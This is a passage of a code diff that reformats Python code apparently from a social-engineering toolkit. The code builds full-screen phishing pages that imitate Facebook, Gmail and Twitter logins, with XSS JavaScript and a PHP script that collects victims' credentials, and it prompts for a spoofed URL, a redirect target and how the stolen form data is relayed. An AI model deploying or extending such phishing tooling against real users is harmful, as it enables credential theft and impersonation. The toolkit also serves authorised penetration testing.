+                jsCompletePath = os.getcwd() + self.pathDivider + \
+                    self.dirFullScreenFacebook + self.pathDivider + "js"
             else:
-                self.errorOutput("[!] Error Couldn't Find the js Folder for Moving and Altering  ","yellow","XSS")
-        
+                self.errorOutput(
+                    "[!] Error Couldn't Find the js Folder for Moving and Altering  ", "yellow", "XSS")
+
         if typeOf == "GMAIL":
             # if path exists lets try to move n copy it
-            if os.path.exists(os.getcwd() + self.pathDivider  + self.dirFullScreenGmail + self.pathDivider  + "js"):
-                jsCompletePath = os.getcwd() + self.pathDivider  + self.dirFullScreenGmail + self.pathDivider  + "js"
+            if os.path.exists(os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + "js"):
+                jsCompletePath = os.getcwd() + self.pathDivider + \
+                    self.dirFullScreenGmail + self.pathDivider + "js"
             else:
-                self.errorOutput("[!] Error Couldn't Find the js Folder for Moving and Altering  ","yellow","XSS")
+                self.errorOutput(
+                    "[!] Error Couldn't Find the js Folder for Moving and Altering  ", "yellow", "XSS")
 
-        # Create new Directory to upload to 
-        newJSDirectory = self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["jsFinalDest"]
+        # Create new Directory to upload to
+        newJSDirectory = self.storageDict[
+            "uploadPath"] + self.pathDivider + self.storageDict["jsFinalDest"]
         # Move Files now
-        err = self.copyJunk(jsCompletePath,newJSDirectory)
+        err = self.copyJunk(jsCompletePath, newJSDirectory)
         if err == "COPY":
             pass
-              
+
         # Create CSS FOLDER
-        self.inputData = self.createDirectory("css",self.storageDict["uploadPath"],self.pathDivider)
+        self.inputData = self.createDirectory(
+            "css", self.storageDict["uploadPath"], self.pathDivider)
         if self.inputData == False:
             # Try to create again
-            self.inputData = self.createDirectory("css",self.storageDict["uploadPath"],self.pathDivider)
+            self.inputData = self.createDirectory(
+                "css", self.storageDict["uploadPath"], self.pathDivider)
             if self.inputData == False:
-                self.errorOutput("[!] Error Couldn't Create the 'css' folder to specified upload path Check Permissions  ","blue","XSS")
+                self.errorOutput(
+                    "[!] Error Couldn't Create the 'css' folder to specified upload path Check Permissions  ", "blue", "XSS")
         else:
             self.storageDict["cssFinalDest"] = "css"
 
         h = []
         if typeOf == "FB":
-            # Grab CSS File code for writing stored in a list not a string  
-            h.append(self.XSSGenCodeCSS(self.storageDict["imgDirPath"],"FB")) 
-        
+            # Grab CSS File code for writing stored in a list not a string
+            h.append(self.XSSGenCodeCSS(self.storageDict["imgDirPath"], "FB"))
 
-        # create CSS file path for uploading  * UNIVERSAL FOR ANY TYPE EVEN CUSTOM
-        self.inputDataTwo =  self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["cssFinalDest"] + self.pathDivider +  "style.css"   
+        # create CSS file path for uploading  * UNIVERSAL FOR ANY TYPE EVEN
+        # CUSTOM
+        self.inputDataTwo = self.storageDict[
+            "uploadPath"] + self.pathDivider + self.storageDict["cssFinalDest"] + self.pathDivider + "style.css"
 
-             
         # Write CSS File to CSS Folder and specified destination
         # anything multiline should be put into a list or tuple
-        self.saveFile(self.inputDataTwo,h,"text")
+        self.saveFile(self.inputDataTwo, h, "text")
         # ZzZz
-        time.sleep(1) 
+        time.sleep(1)
 
         # check file is present
-        if os.path.isfile(self.inputDataTwo):   
-            
+        if os.path.isfile(self.inputDataTwo):
+
             j = []
             if typeOf == "FB":
                 # create custom header.js file code append to list
-                j.append(self.XSSGenCode(self.storageDict,"MIX"))
+                j.append(self.XSSGenCode(self.storageDict, "MIX"))
 
             # create header.js file path for uploading
-            self.inputDataTwo =  self.storageDict["uploadPath"] + self.pathDivider + self.storageDict["jsFinalDest"] + self.pathDivider + "header.js"        
-        
+            self.inputDataTwo = self.storageDict[
+                "uploadPath"] + self.pathDivider + self.storageDict["jsFinalDest"] + self.pathDivider + "header.js"
+
             # Write header.js file
-            self.saveFile(self.inputDataTwo,j,"text")
+            self.saveFile(self.inputDataTwo, j, "text")
             time.sleep(1)
             # if file isn't present throw error permissions probably
             if not os.path.isfile(self.inputDataTwo):
-                self.errorOutput("[!] Error Can't Upload Custom XSS 'header.js' File to Folder, Check Permissions.","yellow","XSS")
+                self.errorOutput(
+                    "[!] Error Can't Upload Custom XSS 'header.js' File to Folder, Check Permissions.", "yellow", "XSS")
 
             if typeOf == "GMAIL":
-            
+
                 # create custom header file
                 j.append(self.gmailXSSGenCode(self.storageDict))
 
         b = []
-        # Create Final PHP file that listens for the POST data to be sent    
+        # Create Final PHP file that listens for the POST data to be sent
         if typeOf == "FB":
 
             # create custom varGrab.php file code append to list
             b.append(self.XSSGenPHPCode())
 
             # create varGrab.php file path for uploading
-            self.inputDataTwo =  self.storageDict["uploadPath"] +  self.pathDivider +"varGrab.php"        
+            self.inputDataTwo = self.storageDict[
+                "uploadPath"] + self.pathDivider + "varGrab.php"
 
             # Write header.js file
-            self.saveFile(self.inputDataTwo,b,"text")
+            self.saveFile(self.inputDataTwo, b, "text")
 
             time.sleep(1)
             # if file isn't present throw error permissions probably
             if not os.path.isfile(self.inputDataTwo):
-                self.errorOutput("[!] Error Can't Upload Custom XSS 'varGrab.php' File to Folder, Check Permissions.","yellow","XSS")
-                             
+                self.errorOutput(
+                    "[!] Error Can't Upload Custom XSS 'varGrab.php' File to Folder, Check Permissions.", "yellow", "XSS")
+
         else:
-            self.errorOutput("[!] Error Can't Upload Custom XSS 'style.css' File to Folder, Check Permissions.","yellow","XSS")   
+            self.errorOutput(
+                "[!] Error Can't Upload Custom XSS 'style.css' File to Folder, Check Permissions.", "yellow", "XSS")
 
         # Display Success Bring User back to XSS gen menu
-        self.errorOutput("[*] Success: Files Have been Written Returning back to XSS Gen Menu","green","XSS")
+        self.errorOutput(
+            "[*] Success: Files Have been Written Returning back to XSS Gen Menu", "green", "XSS")
         # return back to prompt for commands or to exit?
-        self.xssFullScreenGenerator(False) 
-                
+        self.xssFullScreenGenerator(False)
 
     ###########################################################
     ###########################################################
 
-    def createDirectory(self,folderName,uploadPath,pathDivider):
-    # Create Directory return True on success False on Error
+    def createDirectory(self, folderName, uploadPath, pathDivider):
+        # Create Directory return True on success False on Error
 
         try:
             os.makedirs(uploadPath + pathDivider + folderName)
         except OSError:
             if not os.path.isdir(uploadPath + pathDivider + folderName):
                 return False
-        else: 
-            if os.path.isdir(uploadPath + pathDivider + folderName):    
-                return True   
+        else:
+            if os.path.isdir(uploadPath + pathDivider + folderName):
+                return True
             else:
                 return False
 
     #####################################################
     #####################################################
 
-    def returnPathDivider(self,inputData):
-    # Return Path Divider depending on operating system
-        d = inputData.find("\\")       
-        if d == -1: 
-            d = inputData.find("/")                  
-            if d == -1: 
+    def returnPathDivider(self, inputData):
+        # Return Path Divider depending on operating system
+        d = inputData.find("\\")
+        if d == -1:
+            d = inputData.find("/")
+            if d == -1:
                 return False
-            else: 
+            else:
                 return "/"
-        else: 
+        else:
             return "\\"
 
     #####################################################
     #####################################################
 
-    def deleteDir(self,path):
+    def deleteDir(self, path):
         """ deletes the path entirely uses operating systems native commands to speed things up """
 
         # remove directory even if it has files
         shutil.rmtree(path, ignore_errors=True)
 
-
     #####################################################
     #####################################################
 
     def XSSGenPHPCode(self):
-    # This Generates the PHP File that Sits on the backend / control server waiting for user credentials
-  
+        # This Generates the PHP File that Sits on the backend / control server
+        # waiting for user credentials
 
         r = []
         self.inputData = """<?PHP
@@ -951,10 +1013,8 @@ else{ obfuscatePageError(); }
     ################################################
     ################################################
 
-
-    def XSSGenCodeCSS(self,storageDict,cssType):
-    # This Generates the XSS Facebook CSS File Code
- 
+    def XSSGenCodeCSS(self, storageDict, cssType):
+        # This Generates the XSS Facebook CSS File Code
 
         # Facebook Custom XSS CSS File
         if cssType == "FB":
@@ -1089,11 +1149,11 @@ html.fullscreened {
     #######################################################
     #######################################################
 
-    def XSSGenCode(self,storageList,typeOf = "MIX"):
-    #XSS Generator Facebook JavaScript Header
-        
+    def XSSGenCode(self, storageList, typeOf="MIX"):
+        # XSS Generator Facebook JavaScript Header
+
         #@BELOW ARE ALL RELAY XSS COMMUNICATIONS
-        #@CURRENTLY MIXED METHODS ARE ONLY SUPPORTED 
+        #@CURRENTLY MIXED METHODS ARE ONLY SUPPORTED
         #@LAYOUT: FUNCTIONS >> SUBMIT_FUNCTION >> HTML_FULLSCREEN_PAYLOAD
         if typeOf == "MIX":
             d = []
@@ -1244,12 +1304,12 @@ goat =
             d.append(mixMethodsOption)
             return d
 
+   ##########################################################################
+   ##########################################################################
 
-   ################################################################################
-   ################################################################################
- 
-    def returnCorrectPath(self,SETPath,osName = "posix"):
-    # Tries to Return the Absolute Correct Root Path of where the SET folder resides
+    def returnCorrectPath(self, SETPath, osName="posix"):
+        # Tries to Return the Absolute Correct Root Path of where the SET
+        # folder resides
 
         # Init List
         pathList = []
@@ -1264,9 +1324,9 @@ goat =
             self.pathDivider = "\\"
         else:
             # Shouldnt Hit this but lets search for the divider then
-            d = SETPath.find("\\")       
+            d = SETPath.find("\\")
             if d == -1:
-                d = SETPath.find("/")                  
+                d = SETPath.find("/")
                 if d == -1:
                     return "NONE"
                 else:
@@ -1293,24 +1353,24 @@ goat =
             # Create absolute path if this path does work
             self.absolutePath = self.pathCheck
             # Add Test Directory thats always in SETS Root Directory
-            self.pathCheck =  self.pathCheck + "/src"
+            self.pathCheck = self.pathCheck + "/src"
             # Now lets test and see if Directory is there
             if os.path.isdir(self.pathCheck):
                 # Terminate Loop Lets Return the Absolute Path of SET :D Hugs
                 return self.absolutePath
             else:
                 pass
-            
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def deployFullPhish(self,AttackType):
-    # This Asks Questions And Sets up the Generated FullScreen Attack Files For Deployment or Alteration """
+    def deployFullPhish(self, AttackType):
+        # This Asks Questions And Sets up the Generated FullScreen Attack Files
+        # For Deployment or Alteration """
 
         # SERVER OR DIRECTORY
         serverList = []
-        # mail or disk selection 
+        # mail or disk selection
         storageList = []
         # asks all other questions title of page , intel verbose etc.etc.
         otherList = []
@@ -1320,22 +1380,24 @@ goat =
         # Add 0 AttackType to list
         storageList.append(AttackType)
 
-        # Check if PHP is enabled they need it soooWEE 
+        # Check if PHP is enabled they need it soooWEE
         storageList.append(self.phpEnabled())
-  
 
-        self.results = raw_input("\nDo you have a Local Server Setup? (y Or n): ")      
+        self.results = input(
+            "\nDo you have a Local Server Setup? (y Or n): ")
         if self.results.lower()[0] == "y" or self.results.lower() == "yes":
-            self.results = raw_input("\nSpecify Full Path to Web Server Folder (ex: /var/www/html ): ")     
-            resultss = self.results 
+            self.results = input(
+                "\nSpecify Full Path to Web Server Folder (ex: /var/www/html ): ")
+            resultss = self.results
             if os.path.isdir(self.results):
                 # Specify which action to take also
                 serverList.append("ACTION:WEB_SERVER_PATH")
                 # Append Directory to create files to
                 serverList.append(resultss)
             else:
-                self.results = raw_input("\nDir Not Found, Specify Main Web Folder Directory (ex: /var/www ): ")      
-                resultss = self.results 
+                self.results = input(
+                    "\nDir Not Found, Specify Main Web Folder Directory (ex: /var/www ): ")
+                resultss = self.results
                 if os.path.isdir(self.results):
                     # Specify which action to take also
                     serverList.append("ACTION:WEB_SERVER_PATH")
@@ -1343,10 +1405,12 @@ goat =
                     serverList.append(resultss)
                 else:
                     # Didnt say yes or no about FTP Files
-                    self.errorOutput("[!] Error - We Couldn't Find That Web Directory.","yellow")  
+                    self.errorOutput(
+                        "[!] Error - We Couldn't Find That Web Directory.", "yellow")
         else:
-            self.results = raw_input("\nSpecify a Dir path to Load the files to (ex: /home/d/set/attacks ): ")     
-            resultss = self.results 
+            self.results = input(
+                "\nSpecify a Dir path to Load the files to (ex: /home/d/set/attacks ): ")
+            resultss = self.results
             if os.path.isdir(self.results):
                 # Append WebServer Path
                 # Specify which action to take also
@@ -1354,65 +1418,76 @@ goat =
                 # Append Directory to create files to
                 serverList.append(resultss)
             else:
-                self.results = raw_input("\nDirectory not found wanna try to create it? (y Or n): ")   
-                if self.results.lower() == "y" or self.results.lower() == "yes":  
-                    # Create JS Directory 
+                self.results = input(
+                    "\nDirectory not found wanna try to create it? (y Or n): ")
+                if self.results.lower() == "y" or self.results.lower() == "yes":
+                    # Create JS Directory
                     try:
                         os.makedirs(resultss)
                     except:
                         pass
                     if os.path.isdir(resultss):
-                        #Specify which action to take also
+                        # Specify which action to take also
                         serverList.append("ACTION:DIR_PATH")
                         # Append Directory to create files to
                         serverList.append(resultss)
                     else:
-                        self.errorOutput("[!] Error - Couldn't Create the Directory Sorry Check Permissions","yellow")     
+                        self.errorOutput(
+                            "[!] Error - Couldn't Create the Directory Sorry Check Permissions", "yellow")
                 else:
                     # nothing left to do
-                    self.errorOutput("[!] Error - There isn't anything else we can do right now sorry.","yellow")   
+                    self.errorOutput(
+                        "[!] Error - There isn't anything else we can do right now sorry.", "yellow")
 
-        # Get Relay Information Disk or Mail Return / Pass php enabled 													
-	    # Mail or Disk ask user
+        # Get Relay Information Disk or Mail Return / Pass php enabled
+            # Mail or Disk ask user
         phpEnabled = "YES"
-        self.results = raw_input("\nHow Should We Relay Victim Web Form Information? ( [m]ail,[d]isk ) : ")
+        self.results = input(
+            "\nHow Should We Relay Victim Web Form Information? ( [m]ail,[d]isk ) : ")
         if self.results.lower()[0] == "m" or self.results.lower() == "mail":
-            self.outputText("\n[!] Warning - Sendmail Should be Configured and Working with PHP For This to Work\n","red")
+            self.outputText(
+                "\n[!] Warning - Sendmail Should be Configured and Working with PHP For This to Work\n", "red")
             storageList.append("MAIL")
-            self.results = raw_input("\nPlease Enter an Email Address For Form Credentials to Get Sent Too: ")
-            # If we can split by @ its ok not a serious check not a reason for one if there stupid its there fault..
+            self.results = input(
+                "\nPlease Enter an Email Address For Form Credentials to Get Sent Too: ")
+            # If we can split by @ its ok not a serious check not a reason for
+            # one if there stupid its there fault..
             if self.results.split("@") and len(self.results) > 5:
                 storageList.append(self.results)
             else:
                 # Throw Error improper email no @
-                self.errorOutput("[!] Error Please Enter a Correct Email Address","yellow")
+                self.errorOutput(
+                    "[!] Error Please Enter a Correct Email Address", "yellow")
         elif self.results.lower()[0] == "d" or self.results.lower() == "disk":
             # We need PHP to store the file on server
             if phpEnabled == "NO_PHP":
-                self.errorOutput("[!] Error - We Can't Write the File to the Servers Disk Without PHP Enabled","yellow")
+                self.errorOutput(
+                    "[!] Error - We Can't Write the File to the Servers Disk Without PHP Enabled", "yellow")
             else:
                 storageList.append("DISK")
                 # Ask if they want a Random File name created
-                self.results = raw_input("\nWould you like a Random file name Created for each Submission? ([y]es or [n]o) : ")
+                self.results = input(
+                    "\nWould you like a Random file name Created for each Submission? ([y]es or [n]o) : ")
                 if self.results.lower()[0] == "y" or self.results.lower() == "yes":
                     storageList.append("RANDOM_FILE")
                 else:
-                    self.results = raw_input("\nSpecify a File Name for the saved Intel? ( Ex: f00d ) : ")
+                    self.results = input(
+                        "\nSpecify a File Name for the saved Intel? ( Ex: f00d ) : ")
                     # Check if string is AlphaNumerical
-                    if  self.checkString(self.results) == False:
-                        self.errorOutput("[!] Error - Invalid File Name Specified! AlphaNumerical + Periods Only! ","yellow")
+                    if self.checkString(self.results) == False:
+                        self.errorOutput(
+                            "[!] Error - Invalid File Name Specified! AlphaNumerical + Periods Only! ", "yellow")
                     else:
                         storageList.append(self.results)
         else:
-            self.errorOutput("[!] Error - Please Specify either [m]ail or [d]isk ! ","yellow")
+            self.errorOutput(
+                "[!] Error - Please Specify either [m]ail or [d]isk ! ", "yellow")
 
-
-
-       # Check if they just want to output directory   
+       # Check if they just want to output directory
        # Check about Directory Creating Append the Serverlist for FTP Checking to
        # Display Proper Error Message for the user
        # storageList.append(self.createDirectoryFullScreen(serverList))
-      
+
        # All Other Checks
        # Create Intel explain menu
         menuDisplay = """
@@ -1426,9 +1501,10 @@ goat =
             file_get_contents in PHP on selected Server   
         """
         # display About this
-        self.outputText(menuDisplay,"cyan")
+        self.outputText(menuDisplay, "cyan")
         # Set Verbose of Intel Gather
-        self.results = raw_input("\nWould you like to Build a More In-depth Intel Report on Victim ( y Or n ): ")      
+        self.results = input(
+            "\nWould you like to Build a More In-depth Intel Report on Victim ( y Or n ): ")
         if self.results.lower()[0] == "y" or self.results.lower() == "yes":
             otherList.append("INTEL_VERBOSE_LOUD")
         elif self.results.lower()[0] == "n" or self.results.lower() == "no":
@@ -1448,17 +1524,17 @@ goat =
          = be https://my.screenname.aol.com
         """
         # display About this
-        self.outputText(menuDisplay,"green")
-        self.results = raw_input("After the Victim Inputs Info Where Should the Script Redirect?: ")
-        # Check if nothing was entered      
+        self.outputText(menuDisplay, "green")
+        self.results = input(
+            "After the Victim Inputs Info Where Should the Script Redirect?: ")
+        # Check if nothing was entered
         if self.results == "" or self.results == " ":
             # Append Default Redirect Naaaow
             otherList.append("REDIRECT_DEFAULT")
         else:
             # No Checking on URL Let Them Use Whatever lol there bad i guess
             # Append Default Redirect Naaaow
-            otherList.append(self.results)  
-
+            otherList.append(self.results)
 
         # Spoof link
         menuDisplay = """
@@ -1471,9 +1547,10 @@ goat =
          = to that URL..
         """
         # display About this
-        self.outputText(menuDisplay,"darkyellow")
-        self.results = raw_input("What should the URL be spoofed to? (ex: https://my.screenname.aol.com): ")
-        # Check if nothing was entered      
+        self.outputText(menuDisplay, "darkyellow")
+        self.results = input(
+            "What should the URL be spoofed to? (ex: https://my.screenname.aol.com): ")
+        # Check if nothing was entered
         if self.results == "" or self.results == " ":
             # Append Default Redirect Naaaow
             otherList.append("DEFAULT_SPOOF")
@@ -1489,9 +1566,10 @@ goat =
          = to be?
         """
         # display About this
-        self.outputText(menuDisplay,"red")
-        self.results = raw_input("What should the URL name be? (ex: Aol Login): ")
-        # Check if nothing was entered      
+        self.outputText(menuDisplay, "red")
+        self.results = input(
+            "What should the URL name be? (ex: Aol Login): ")
+        # Check if nothing was entered
         if self.results == "" or self.results == " ":
             # Append Default Redirect Naaaow
             otherList.append("DEFAULT_URL_NAME")
@@ -1509,8 +1587,9 @@ goat =
         =    name you come up with
         """
         # display About this
-        self.outputText(menuDisplay,"blue")
-        self.results = raw_input("What Should the Main Index PHP File Be Called? ( ex: login ) : ")
+        self.outputText(menuDisplay, "blue")
+        self.results = input(
+            "What Should the Main Index PHP File Be Called? ( ex: login ) : ")
         if self.results == "" or self.results == " ":
             # Append Default Redirect Naaaow
             otherList.append("INDEX_DEFAULT")
@@ -1519,7 +1598,8 @@ goat =
             # if it doesn't return a -1 it found a decimal
             if check != -1:
                 # Throw Error we found a dot
-                self.errorOutput("[*] Error - Didn't We Say Not to Add an Extension, WOW...","yellow")
+                self.errorOutput(
+                    "[*] Error - Didn't We Say Not to Add an Extension, WOW...", "yellow")
             else:
                 # Append name of the File
                 otherList.append(self.results)
@@ -1530,8 +1610,9 @@ goat =
         =       Title of the Webpage. 
         """
         # display About this
-        self.outputText(menuDisplay,"cyan")
-        self.results = raw_input("What Should the Title of the Page be? (ex: Twitter Login ) : ")
+        self.outputText(menuDisplay, "cyan")
+        self.results = input(
+            "What Should the Title of the Page be? (ex: Twitter Login ) : ")
         if self.results == "" or self.results == " ":
             # Append Default Redirect Naaaow
             otherList.append("TITLE_DEFAULT")
@@ -1539,32 +1620,35 @@ goat =
             # Append name of the File
             otherList.append(self.results)
 
-
         # Pass Apended List lets Create files
         #createGarbage = self.createPhishFoodFullScreen(storageList,serverList,otherList)
 
         fileError = []
-	# Lets Create the files 
+        # Lets Create the files
         if storageList[0] == "FB" or storageList[0] == "TWITTER" or storageList[0] == "AOL" or storageList[0] == "GMAIL" or storageList[0] == "OUTLOOK":
             # Pass Options Create Output Files in Specified WebServer Folder
-            fileError = self.createFullScreenFile(storageList,serverList,otherList)
+            fileError = self.createFullScreenFile(
+                storageList, serverList, otherList)
 
         # Check if it was a success
         if fileError == True:
-            self.outputText("\n[*] Creation of Files was a Success.. Lets do this... :D \n","darkyellow")
-            self.errorOutput("[*] Returning to FullScreen Menu to go back to Main just Press 99 \n","yellow")
-            self.errorOutput("","white")
+            self.outputText(
+                "\n[*] Creation of Files was a Success.. Lets do this... :D \n", "darkyellow")
+            self.errorOutput(
+                "[*] Returning to FullScreen Menu to go back to Main just Press 99 \n", "yellow")
+            self.errorOutput("", "white")
         else:
-            self.errorOutput("[*] Error - Something Went Wrong Try Again BraH...","yellow")
-        
-   ################################################################################
-   ################################################################################
+            self.errorOutput(
+                "[*] Error - Something Went Wrong Try Again BraH...", "yellow")
+
+   ##########################################################################
+   ##########################################################################
 
     def otherOptionsFullScreen(self):
         """  Other Options Asked before Full-Screen Attack Files are
              Created and Deployed in the field
-        """  
-       
+        """
+
         # Set Storage List
         storageList = []
         # Create Intel explain menu
@@ -1579,9 +1663,10 @@ goat =
             file_get_contents in PHP on selected Server   
         """
         # display About this
-        self.outputText(menuDisplay,"yellow")
+        self.outputText(menuDisplay, "yellow")
         # Set Verbose of Intel Gather
-        self.results = raw_input("\nWould you like to Build a More In-depth Intel Report on Victim ( y Or n ): ")      
+        self.results = input(
+            "\nWould you like to Build a More In-depth Intel Report on Victim ( y Or n ): ")
         if self.results.lower()[0] == "y" or self.results.lower() == "yes":
             storageList.append("INTEL_VERBOSE_LOUD")
         elif self.results.lower()[0] == "n" or self.results.lower() == "no":
@@ -1601,17 +1686,17 @@ goat =
          = be https://my.screenname.aol.com
         """
         # display About this
-        self.outputText(menuDisplay,"yellow")
-        self.results = raw_input("After the Victim Inputs Info Where Should the Script Redirect?: ")
-        # Check if nothing was entered      
+        self.outputText(menuDisplay, "yellow")
+        self.results = input(
+            "After the Victim Inputs Info Where Should the Script Redirect?: ")
+        # Check if nothing was entered
         if self.results == "" or self.results == " ":
             # Append Default Redirect Naaaow
             storageList.append("REDIRECT_DEFAULT")
         else:
             # No Checking on URL Let Them Use Whatever lol there bad i guess
             # Append Default Redirect Naaaow
-            storageList.append(self.results)  
-
+            storageList.append(self.results)
 
         # Spoof link
         menuDisplay = """
@@ -1624,9 +1709,10 @@ goat =
          = to that URL..
         """
         # display About this
-        self.outputText(menuDisplay,"yellow")
-        self.results = raw_input("What should the URL be spoofed to? (ex: https://my.screenname.aol.com): ")
-        # Check if nothing was entered      
+        self.outputText(menuDisplay, "yellow")
+        self.results = input(
+            "What should the URL be spoofed to? (ex: https://my.screenname.aol.com): ")
+        # Check if nothing was entered
         if self.results == "" or self.results == " ":
             # Append Default Redirect Naaaow
             storageList.append("DEFAULT_SPOOF")
@@ -1642,9 +1728,10 @@ goat =
          = to be?
         """
         # display About this
-        self.outputText(menuDisplay,"yellow")
-        self.results = raw_input("What should the URL name be? (ex: Aol Login): ")
-        # Check if nothing was entered      
+        self.outputText(menuDisplay, "yellow")
+        self.results = input(
+            "What should the URL name be? (ex: Aol Login): ")
+        # Check if nothing was entered
         if self.results == "" or self.results == " ":
             # Append Default Redirect Naaaow
             storageList.append("DEFAULT_URL_NAME")
@@ -1662,8 +1749,9 @@ goat =
         =    name you come up with
         """
         # display About this
-        self.outputText(menuDisplay,"yellow")
-        self.results = raw_input("What Should the Main Index PHP File Be Called? ( ex: login ) : ")
+        self.outputText(menuDisplay, "yellow")
+        self.results = input(
+            "What Should the Main Index PHP File Be Called? ( ex: login ) : ")
         if self.results == "" or self.results == " ":
             # Append Default Redirect Naaaow
             storageList.append("INDEX_DEFAULT")
@@ -1672,12 +1760,11 @@ goat =
             # if it doesn't return a -1 it found a decimal
             if check != -1:
                 # Throw Error we found a dot
-                self.errorOutput("[*] Error - Didn't We Say Not to Add an Extension, WOW...","yellow")
+                self.errorOutput(
+                    "[*] Error - Didn't We Say Not to Add an Extension, WOW...", "yellow")
             else:
                 # Append name of the File
                 storageList.append(self.results)
-
-
 
         menuDisplay = """
         \n
@@ -1685,8 +1772,9 @@ goat =
         =       Title of the Webpage.
         """
         # display About this
-        self.outputText(menuDisplay,"blue")
-        self.results = raw_input("What Should the Title of the Page be? (ex: AOL Login ) : ")
+        self.outputText(menuDisplay, "blue")
+        self.results = input(
+            "What Should the Title of the Page be? (ex: AOL Login ) : ")
         if self.results == "" or self.results == " ":
             # Append Default Redirect Naaaow
             storageList.append("TITLE_DEFAULT")
@@ -1694,100 +1782,110 @@ goat =
             # Append name of the File
             storageList.append(self.results)
 
-
         # Return Storage List for Processing
         return storageList
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def copyJunk(self,src, dst):
-    # Copy Directory to New Directory
+    def copyJunk(self, src, dst):
+        # Copy Directory to New Directory
 
         try:
             shutil.copytree(src, dst)
-        except OSError as exc: 
+        except OSError as exc:
             if exc.errno == errno.ENOTDIR:
                 shutil.copy(src, dst)
             else:
                 return "COPY"
 
+   ##########################################################################
+   ##########################################################################
 
-   ################################################################################
-   ################################################################################
-
-    def createFullScreenFile(self,optionList,serverList,otherList):
+    def createFullScreenFile(self, optionList, serverList, otherList):
 
         if serverList[0] == "ACTION:WEB_SERVER_PATH":
 
             if optionList[0] == "GMAIL":
-                self.outputText("\n[*] Creating GMAIL FullScreen Files in Specified WebServer Path...\n","darkgreen")
+                self.outputText(
+                    "\n[*] Creating GMAIL FullScreen Files in Specified WebServer Path...\n", "darkgreen")
             elif optionList[0] == "FB":
-                self.outputText("\n[*] Creating Facebook FullScreen Files in Specified WebServer Path...\n","darkgreen")
+                self.outputText(
+                    "\n[*] Creating Facebook FullScreen Files in Specified WebServer Path...\n", "darkgreen")
             elif optionList[0] == "TWITTER":
-                self.outputText("\n[*] Creating Twitter FullScreen Files in Specified WebServer Path...\n","darkgreen")
+                self.outputText(
+                    "\n[*] Creating Twitter FullScreen Files in Specified WebServer Path...\n", "darkgreen")
         else:
 
             if optionList[0] == "GMAIL":
-                self.outputText("\n[*] Creating GMAIL FullScreen Files in Specified Directory Path...\n","green")
+                self.outputText(
+                    "\n[*] Creating GMAIL FullScreen Files in Specified Directory Path...\n", "green")
             elif optionList[0] == "FB":
-                self.outputText("\n[*] Creating Facebook FullScreen Files in Specified Directory Path...\n","darkgreen")
+                self.outputText(
+                    "\n[*] Creating Facebook FullScreen Files in Specified Directory Path...\n", "darkgreen")
             elif optionList[0] == "TWITTER":
-                self.outputText("\n[*] Creating Twitter FullScreen Files in Specified Directory Path...\n","darkgreen")
-
+                self.outputText(
+                    "\n[*] Creating Twitter FullScreen Files in Specified Directory Path...\n", "darkgreen")
 
         # GRAB Path Divider used by operating system
         self.pathDivider = self.returnPathDivider(os.getcwd())
 
-        self.outputText("\n[*] Attempting to Create Directory + Moving Images there....\n","darkgreen")
-
+        self.outputText(
+            "\n[*] Attempting to Create Directory + Moving Images there....\n", "darkgreen")
 
         if optionList[0] == "FB":
-            imageFileDirectory = os.getcwd() + self.pathDivider + self.dirFullScreenFacebook + self.pathDivider + "img"
+            imageFileDirectory = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenFacebook + self.pathDivider + "img"
         elif optionList[0] == "GMAIL":
-            imageFileDirectory = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + "img"
+            imageFileDirectory = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenGmail + self.pathDivider + "img"
         elif optionList[0] == "TWITTER":
-            imageFileDirectory = os.getcwd() + self.pathDivider + self.dirFullScreenTwitter + self.pathDivider + "img"
-
+            imageFileDirectory = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenTwitter + self.pathDivider + "img"
 
         newImgDirectory = serverList[1] + self.pathDivider + "img"
 
-        if self.copyJunk(imageFileDirectory,newImgDirectory) == "COPY":
-        #if err == "COPY":
+        if self.copyJunk(imageFileDirectory, newImgDirectory) == "COPY":
+            # if err == "COPY":
             pass
 
-
-        self.outputText("\n[*] Attempting to move JS Files and create JS Directory.......\n","red")
+        self.outputText(
+            "\n[*] Attempting to move JS Files and create JS Directory.......\n", "red")
         if optionList[0] == "FB":
-            jsCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenFacebook + self.pathDivider + "js"        
+            jsCompletePath = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenFacebook + self.pathDivider + "js"
         elif optionList[0] == "GMAIL":
-            jsCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + "js"
+            jsCompletePath = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenGmail + self.pathDivider + "js"
         elif optionList[0] == "TWITTER":
-            jsCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenTwitter + self.pathDivider + "js"
+            jsCompletePath = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenTwitter + self.pathDivider + "js"
 
         newJSDirectory = serverList[1] + self.pathDivider + "js"
         # Move Files now
-        err = self.copyJunk(jsCompletePath,newJSDirectory)
+        err = self.copyJunk(jsCompletePath, newJSDirectory)
         if err == "COPY":
             pass
 
-
-        self.outputText("\n[*] Attempting to move CSS Files.......\n","red")
+        self.outputText("\n[*] Attempting to move CSS Files.......\n", "red")
         if optionList[0] == "FB":
-            cssCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenFacebook + self.pathDivider + "css"        
+            cssCompletePath = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenFacebook + self.pathDivider + "css"
         elif optionList[0] == "GMAIL":
-            cssCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + "css"
+            cssCompletePath = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenGmail + self.pathDivider + "css"
         elif optionList[0] == "TWITTER":
-            cssCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenTwitter + self.pathDivider + "css"   
+            cssCompletePath = os.getcwd() + self.pathDivider + \
+                self.dirFullScreenTwitter + self.pathDivider + "css"
 
         newCSSDirectory = serverList[1] + self.pathDivider + "css"
         # Move Files now
-        err = self.copyJunk(cssCompletePath,newCSSDirectory)
+        err = self.copyJunk(cssCompletePath, newCSSDirectory)
